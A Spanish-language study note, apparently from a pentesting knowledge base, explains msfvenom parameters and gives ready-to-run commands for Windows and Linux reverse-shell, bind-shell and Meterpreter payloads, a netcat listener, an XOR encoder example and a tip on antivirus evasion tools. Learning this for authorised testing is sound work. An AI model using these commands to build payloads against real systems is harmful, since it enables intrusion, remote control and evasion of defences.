------------
Tags: #Metasploit #msfconsole #msfvenom #Payloads #Exploitation #ReverseShell #BindShell 

----

# Definición

**[[Msfvenom]]** es una herramienta incluida en el framework de [[Metasploit]], utilizada para generar _payloads_ (código malicioso o útil para intrusión) y, opcionalmente, incrustarlos en diferentes formatos de archivos ejecutables o scripts. Es muy común en pruebas de penetración y ejercicios de Red Team.

---
# Parámetros y Usos
| Parámetro             | Descripción                                                                                                   | ¿Por qué se usa? / Ejemplo                                                                                       |
| --------------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `-p <payload>`        | Especifica el payload que se va a generar. Puede ser `staged` o `non-staged`, y depende del sistema objetivo. | Ej: `windows/x64/meterpreter/reverse_tcp` para conexión inversa con Meterpreter en Windows.                      |
| `LHOST=<IP>`          | IP del atacante (tu máquina), donde el payload se conectará para establecer sesión.                           | Se usa en payloads _reverse_. Ej: `LHOST=192.168.1.10`                                                           |
| `LPORT=<PUERTO>`      | Puerto del atacante que estará a la escucha del payload.                                                      | Ej: `LPORT=4444`                                                                                                 |
| `-a <arquitectura>`   | Define la arquitectura del objetivo. Puede ser `x86`, `x64`, `armle`, etc.                                    | Asegura compatibilidad con el sistema de destino. Ej: `-a x64` para sistemas de 64 bits.                         |
| `--platform <SO>`     | Especifica el sistema operativo objetivo: `windows`, `linux`, `android`, etc.                                 | Para generar código específico al entorno del objetivo. Ej: `--platform linux`                                   |
| `-f <formato>`        | Formato de salida: `exe`, `elf`, `apk`, `raw`, `c`, `ps1`, etc.                                               | Elige el tipo de archivo según el entorno objetivo. Ej: `-f exe` para Windows, `-f elf` para Linux.              |
| `-o <archivo>`        | Ruta y nombre del archivo de salida generado.                                                                 | Se recomienda usar una carpeta propia (ej: `output/`) para organizar payloads y evitar ejecuciones accidentales. |
| `-e <encoder>`        | (Opcional) Codificador para ofuscar el payload y dificultar su detección por antivirus.                       | Ej: `-e x86/shikata_ga_nai`. Usar con precaución: algunos codificadores pueden corromper el payload.             |
| `-i <iteraciones>`    | (Opcional) Número de veces que se aplica el codificador.                                                      | Ej: `-i 5` para aplicar 5 veces el encoder, aunque más iteraciones no siempre implican mejor evasión.            |
| `--bad-chars <bytes>` | (Opcional) Excluye caracteres problemáticos (como `\x00`, `\x0a`, etc.) en el payload generado.               | Útil al inyectar en buffers, exploits o cuando el entorno lo requiere. Ej: `--bad-chars "\x00\x0a"`              |
| `-l payloads`         | Lista todos los payloads disponibles.                                                                         | Sirve para explorar opciones por SO. También puedes filtrar con `grep`, ej: `msfvenom -l payloads                |
- Ver todos los payloads desde `msfvenom`

`msfvenom -l payloads`
### ✅ Ejemplos para Windows

- Para generar un [[payload staged]] para windows:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=[MI IP] LPORT=4646 -f exe -o [NOMBRE DEL ARCHIVO]
```

- Para generar un [[payload non-staged]] para windows:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=[MI IP] LPORT=4646 -f exe -o [NOMBRE DEL ARCHIVO]
```

- Para generar un [[payload non-staged]] para windows para usar por **Netcat**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=[MI IP] LPORT=4646 -f exe -o [NOMBRE DEL ARCHIVO]
```

### ✅ Ejemplos para Linux

- Para generar un **payload staged para Linux** (`meterpreter` con conexión inversa):
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux -a x64 LHOST=[MI IP] LPORT=4646 -f elf -o [NOMBRE DEL ARCHIVO]
```


- Para generar un **payload non-staged para Linux** (`shell` inversa con **Netcat**):
```bash
msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=[MI IP] LPORT=4646 -f elf -o [NOMBRE DEL ARCHIVO]
```

>>>>En la maquina atacante:
```bash
		nc -lvnp 4646
```


- Para generar un **payload tipo bind shell** (el atacante se conecta al objetivo):
```bash
msfvenom -p linux/x64/shell_bind_tcp --platform linux -a x64 LPORT=4646 -f elf -o [NOMBRE DEL ARCHIVO]
```


- Para generar un **payload con codificación básica para evadir AV**:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[MI IP] LPORT=4646 -e x64/xor -f elf -o [NOMBRE DEL ARCHIVO]
```

> 🔐 **Nota**: Aunque los encoders pueden ayudar, muchos antivirus modernos los detectan. Para mayor evasión, se recomienda el uso de herramientas como `Veil`, `Shellter`, `obfuscator-llvm`, o empaquetar el binario de forma creativa.